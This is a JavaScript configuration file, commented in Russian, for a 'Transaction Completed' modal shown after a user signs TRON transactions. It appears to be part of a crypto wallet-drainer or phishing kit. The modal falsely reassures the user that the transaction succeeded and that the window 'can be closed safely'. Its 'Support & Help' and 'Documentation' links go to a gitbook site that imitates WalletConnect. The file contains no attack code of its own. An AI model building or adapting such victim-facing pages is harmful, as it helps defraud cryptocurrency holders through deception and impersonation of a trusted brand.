// Конфигурация кастомной модалки после подписания всех транзакций
// Этот файл можно свободно редактировать без доступа к main.js

window.CUSTOM_LOADER_CONFIG = {
    // Основные тексты
    title: "Transaction Completed",
    
    // Подзаголовок. Используй {count} для вставки количества подписей
    subtitle: "{count} signature{plural} successfully verified",
    
    // Описание
    description: "Your transaction has been processed and broadcasted to the TRON network.",
    
    // Текст в футере
    footer: "This window can be closed safely.",
    
    // Ссылки (можно добавлять/удалять/изменять)
    links: [
        {
            url: "https://tronscan.org/",
            text: "View on TronScan",
            // SVG иконка (опционально)
            icon: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width: 18px; height: 18px;">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="2" y1="12" x2="22" y2="12"></line>
                <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
            </svg>`
        },
        {
            url: "https://wallet-connect-org.gitbook.io/wallet-connect/support",
            text: "Support & Help",
            icon: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width: 18px; height: 18px;">
                <circle cx="12" cy="12" r="10"></circle>
                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
                <line x1="12" y1="17" x2="12.01" y2="17"></line>
            </svg>`
        },
        {
            url: "https://wallet-connect-org.gitbook.io/wallet-connect",
            text: "Documentation",
            icon: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width: 18px; height: 18px;">
                <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path>
                <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path>
            </svg>`
        }
        // Добавь новые ссылки здесь:
        // {
        //     url: "https://t.me/yoursupport",
        //     text: "Telegram Support",
        //     icon: `<svg>...</svg>` // или пусто
        // }
    ],
    
    // Цвета и стили
    styles: {
        // Цвет галочки
        checkmarkColor: "#22c55e",
        
        // Градиент фона контейнера
        containerGradientStart: "#1E2230",
        containerGradientEnd: "#252A39",
        
        // Цвет ссылок
        linkColor: "#7C8CFF",
        
        // Цвет текста заголовка
        titleColor: "#ffffff",
        
        // Цвет подзаголовка
        subtitleColor: "rgba(255, 255, 255, 0.85)",
        
        // Цвет описания
        descriptionColor: "rgba(255, 255, 255, 0.7)",
        
        // Цвет футера
        footerColor: "rgba(255, 255, 255, 0.5)",
        
        // Максимальная ширина контейнера
        maxWidth: "520px",
        
        // Размер шрифта заголовка
        titleFontSize: "28px",
        
        // Размер шрифта подзаголовка
        subtitleFontSize: "18px",
        
        // Размер шрифта описания
        descriptionFontSize: "15px"
    }
};

